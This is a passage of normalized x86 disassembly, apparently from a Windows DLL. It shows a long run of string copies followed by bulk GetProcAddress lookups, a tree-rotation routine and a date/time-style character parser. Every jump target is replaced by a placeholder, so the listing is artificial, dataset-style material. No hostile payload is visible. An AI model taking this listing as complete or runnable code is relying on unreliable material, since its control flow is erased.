call sub_100796a0
lea eax [ ebp - 0x1ac ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x1ac ]
push eax
lea ecx [ esi + 0x57a8 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x70 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x70 ]
push edx
lea eax [ esi + 0x58b0 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x65c ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x65c ]
push ecx
lea edx [ esi + 0x59b8 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x10 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ esi + 0x5ac0 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x7a0 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x7a0 ]
push edx
lea eax [ esi + 0x5bc8 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x28c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x28c ]
push ecx
lea edx [ esi + 0x5cd0 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x1c8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x1c8 ]
push eax
lea ecx [ esi + 0x5dd8 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x560 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x560 ]
push edx
lea eax [ esi + 0x5ee0 ]
push eax
call sub_100796a0
lea eax [ ebp - 0xc38 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xc38 ]
push ecx
lea edx [ esi + 0x5fe8 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x1e4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x1e4 ]
push eax
lea ecx [ esi + 0x60f0 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x6a4 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x6a4 ]
push edx
lea eax [ esi + 0x61f8 ]
push eax
call sub_100796a0
lea eax [ ebp - 0xb68 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0xb68 ]
push ecx
lea edx [ esi + 0x6300 ]
push edx
call sub_100796a0
lea eax [ ebp - 0x96c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea eax [ ebp - 0x96c ]
push eax
lea ecx [ esi + 0x6408 ]
push ecx
call sub_100796a0
lea eax [ ebp - 0x21c ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea edx [ ebp - 0x21c ]
push edx
lea eax [ esi + 0x6510 ]
push eax
call sub_100796a0
lea eax [ ebp - 0x420 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
inc eax
push eax
lea ecx [ ebp - 0x420 ]
push ecx
add esi 0x6618
push esi
call sub_100796a0
mov eax [ rw-data ]
mov esi [ GetProcAddress@IAT ]
add esp 0xc
lea edx [ ebp - 0x830 ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x380 ]
mov [ ecx + 0x104 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x710 ]
mov [ ecx + 0x20c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xcfc ]
mov [ ecx + 0x314 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x5cc ]
mov [ ecx + 0x41c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x9bc ]
mov [ ecx + 0x524 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x87c ]
mov [ ecx + 0x62c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x7c4 ]
mov [ ecx + 0x734 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xb8 ]
mov [ ecx + 0x83c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xd34 ]
mov [ ecx + 0x944 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
mov [ ecx + 0xa4c ] eax
lea edx [ ebp - 0xb94 ]
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x77c ]
mov [ ecx + 0xb54 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x2c4 ]
mov [ ecx + 0xc5c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x28 ]
mov [ ecx + 0xd64 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x190 ]
mov [ ecx + 0xe6c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xb10 ]
mov [ ecx + 0xf74 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xa0 ]
mov [ ecx + 0x107c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x7e8 ]
mov [ ecx + 0x1184 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x104 ]
mov [ ecx + 0x128c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x460 ]
mov [ ecx + 0x1394 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x40 ]
mov [ ecx + 0x149c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x200 ]
mov [ ecx + 0x15a4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x500 ]
mov [ ecx + 0x16ac ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xc0c ]
mov [ ecx + 0x17b4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xd70 ]
mov [ ecx + 0x18bc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x440 ]
mov [ ecx + 0x19c4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x4c0 ]
mov [ ecx + 0x1acc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x8f4 ]
mov [ ecx + 0x1bd4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x270 ]
mov [ ecx + 0x1cdc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x300 ]
mov [ ecx + 0x1de4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xbe0 ]
mov [ ecx + 0x1eec ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x540 ]
mov [ ecx + 0x1ff4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x944 ]
mov [ ecx + 0x20fc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xb3c ]
mov [ ecx + 0x2204 ] eax
push edx
mov eax [ rw-data ]
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x584 ]
mov [ ecx + 0x230c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xae4 ]
mov [ ecx + 0x2414 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x8a4 ]
mov [ ecx + 0x251c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x400 ]
mov [ ecx + 0x2624 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x8cc ]
mov [ ecx + 0x272c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x480 ]
mov [ ecx + 0x2834 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x80c ]
mov [ ecx + 0x293c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x158 ]
mov [ ecx + 0x2a44 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xd0 ]
mov [ ecx + 0x2b4c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xc68 ]
mov [ ecx + 0x2c54 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x4a0 ]
mov [ ecx + 0x2d5c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x3c0 ]
mov [ ecx + 0x2e64 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xe8 ]
mov [ ecx + 0x2f6c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x614 ]
mov [ ecx + 0x3074 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xcc8 ]
mov [ ecx + 0x317c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xa34 ]
mov [ ecx + 0x3284 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x854 ]
mov [ ecx + 0x338c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x320 ]
mov [ ecx + 0x3494 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x120 ]
mov [ ecx + 0x359c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xa8c ]
mov [ ecx + 0x36a4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xc98 ]
mov [ ecx + 0x37ac ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x680 ]
mov [ ecx + 0x38b4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x734 ]
mov [ ecx + 0x39bc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x9e4 ]
mov [ ecx + 0x3ac4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x4e0 ]
mov [ ecx + 0x3bcc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x340 ]
mov [ ecx + 0x3cd4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x5a8 ]
mov [ ecx + 0x3ddc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x238 ]
mov [ ecx + 0x3ee4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x6ec ]
mov [ ecx + 0x3fec ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x6c8 ]
mov [ ecx + 0x40f4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x58 ]
mov [ ecx + 0x41fc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x2a8 ]
mov [ ecx + 0x4304 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x88 ]
mov [ ecx + 0x440c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xdb0 ]
mov [ ecx + 0x4514 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
mov [ ecx + 0x461c ] eax
mov eax [ rw-data ]
lea edx [ ebp - 0x520 ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x758 ]
mov [ ecx + 0x4724 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x638 ]
mov [ ecx + 0x482c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x13c ]
mov [ ecx + 0x4934 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x2e0 ]
mov [ ecx + 0x4a3c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x360 ]
mov [ ecx + 0x4b44 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xab8 ]
mov [ ecx + 0x4c4c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x5f0 ]
mov [ ecx + 0x4d54 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xdf0 ]
mov [ ecx + 0x4e5c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x3a0 ]
mov [ ecx + 0x4f64 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xa60 ]
mov [ ecx + 0x506c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x174 ]
mov [ ecx + 0x5174 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x994 ]
mov [ ecx + 0x527c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x3e0 ]
mov [ ecx + 0x5384 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xa0c ]
mov [ ecx + 0x548c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x254 ]
mov [ ecx + 0x5594 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x91c ]
mov [ ecx + 0x569c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x1ac ]
mov [ ecx + 0x57a4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x70 ]
mov [ ecx + 0x58ac ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x65c ]
mov [ ecx + 0x59b4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x10 ]
mov [ ecx + 0x5abc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x7a0 ]
mov [ ecx + 0x5bc4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x28c ]
mov [ ecx + 0x5ccc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
mov [ ecx + 0x5dd4 ] eax
lea edx [ ebp - 0x1c8 ]
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x560 ]
mov [ ecx + 0x5edc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xc38 ]
mov [ ecx + 0x5fe4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x1e4 ]
mov [ ecx + 0x60ec ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x6a4 ]
mov [ ecx + 0x61f4 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0xb68 ]
mov [ ecx + 0x62fc ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x96c ]
mov [ ecx + 0x6404 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x21c ]
mov [ ecx + 0x650c ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
lea edx [ ebp - 0x420 ]
mov [ ecx + 0x6614 ] eax
mov eax [ rw-data ]
push edx
push eax
call esi
mov ecx [ rw-data ]
mov [ ecx + 0x671c ] eax
jmp r-xdata
sub_10065140
push ebp
mov ebp esp
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx ] edx
mov edx [ eax + 0x8 ]
cmp [ edx + 0x15 ] 0x0
jne r-xdata
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov [ edx + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x4 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
mov [ edx + 0x8 ] eax
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_10065195
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
mov edi ecx
lea esi [ edi + 0x14 ]
push esi
xor ebx ebx
push ebx
push 0x30
call sub_1003088d
push esi
movzx eax ax
push ebx
push 0x3a
mov [ ebp - 0x8 ] eax
call sub_1003088d
push esi
movzx eax ax
push ebx
push 0x2c
mov [ ebp - 0x10 ] eax
call sub_1003088d
push esi
movzx eax ax
push ebx
push 0x2f
mov [ ebp - 0x14 ] eax
call sub_1003088d
push esi
movzx eax ax
push ebx
push 0x20
mov [ ebp - 0x18 ] eax
call sub_1003088d
movzx eax ax
mov [ ebp - 0xc ] eax
mov eax [ edi ]
add esp 0x3c
mov ecx edi
call [ eax + 0x4 ]
push 0x2
cmp eax ebx
mov [ ebp - 0x4 ] eax
pop ebx
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
mov esi [ ebp + 0x20 ]
test al al
jne r-xdata
mov [ ebp - 0x4 ] ebx
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov ebx [ ebp - 0xc ]
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
mov ebx [ ebp - 0xc ]
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005576a
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x10 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
movzx eax [ ebp - 0x8 ]
movzx ecx [ ebp + 0x12 ]
add eax 0x9
cmp eax ecx
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005576a
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x8 ]
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x14 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
mov ebx [ ebp + 0x24 ]
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10062235
or [ esi ] eax
add esp 0x18
dec [ ebx ]
jmp r-xdata
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10062235
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005576a
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
jne r-xdata
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x10 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
cmp [ ebp - 0x4 ] 0x4
mov eax [ ebp - 0x20 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp + 0x10 ] eax
jne r-xdata
or [ esi ] 0x2
jmp r-xdata
movzx eax [ ebp - 0x8 ]
movzx ecx [ ebp + 0x12 ]
add eax 0x9
cmp eax ecx
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x18 ]
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
mov eax [ ebp - 0x20 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ebp + 0x12 ] bx
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005576a
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
je r-xdata
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
mov ebx [ ebp - 0x8 ]
cmp [ ebp + 0x12 ] bx
jb r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
mov ax [ ebp + 0x12 ]
cmp ax [ ebp - 0x14 ]
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
mov ebx [ ebp + 0x24 ]
add ebx 0x10
push ebx
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10062235
or [ esi ] eax
add esp 0x18
dec [ ebx ]
mov ebx [ ebp - 0xc ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
or [ esi ] 0x1
cmp [ ebp - 0x4 ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_10062235
add esp 0x18
or [ esi ] eax
jmp r-xdata
push [ ebp + 0x24 ]
mov eax [ edi ]
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
movzx ecx [ ebp + 0x12 ]
movzx eax bx
add eax 0x9
cmp eax ecx
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_10023e65
mov ax [ ebp + 0x12 ]
